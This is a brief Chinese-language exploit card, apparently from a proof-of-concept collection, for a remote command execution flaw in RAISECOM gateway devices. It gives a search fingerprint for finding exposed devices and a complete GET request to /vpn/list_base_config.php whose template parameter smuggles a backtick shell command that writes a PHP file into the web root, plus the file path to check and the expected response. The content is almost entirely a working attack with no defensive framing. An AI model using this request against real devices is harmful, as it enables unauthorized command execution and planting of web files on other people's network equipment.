# RAISECOM网关设备list_base_config.php存在远程命令执行漏洞

RAISECOM ｜ 命令执行 ｜ —
- **指纹**：`body="/images/raisecom/back.gif"`
- **请求**：`GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Finfo.php%60 HTTP/1.1`

**Payload**
```
文件路径http://ip/tmp/info.php
```
- **响应特征**：200